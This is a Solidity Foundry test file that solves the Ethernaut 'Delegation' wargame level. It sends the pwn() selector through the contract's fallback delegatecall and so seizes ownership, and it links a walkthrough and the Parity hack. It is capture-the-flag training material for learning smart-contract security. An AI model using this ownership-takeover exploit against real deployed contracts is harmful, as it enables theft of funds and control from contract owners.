// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/Delegation.sol";
import "src/levels/DelegationFactory.sol";

contract TestDelegation is BaseTest {
    Delegation private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new DelegationFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = Delegation(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level.owner(), address(levelFactory));
    }

    function exploitLevel() internal override {
        vm.startPrank(player, player);

        /** CODE YOUR EXPLOIT HERE */
        // https://ethernaut.openzeppelin.com/level/0x9451961b7Aea1Df57bc20CC68D72f662241b5493
        // run with `$> forge test -vv --match-contract Delegation`

        // a great explanation for this little amount of code can be also found here:
        // https://medium.com/coinmonks/ethernaut-lvl-6-walkthrough-how-to-abuse-the-delicate-delegatecall-466b26c429e4
        // actually PARITY HACK $30 had this issues
        // also important to understand the use of fallback(https://blog.soliditylang.org/2020/03/26/fallback-receive-split/)
        // and storage slots

        //(bool success, ) = address(level).call(abi.encodeWithSignature("pwn()"));
        // or
        (bool success, ) = address(level).call(abi.encodeWithSelector(bytes4(keccak256("pwn()"))));
        emit log_named_bytes32("Encoded Selector", bytes32(keccak256("pwn()")));
        require(success, "call not successful");

        assertEq(level.owner(), player);

        vm.stopPrank();
    }
}
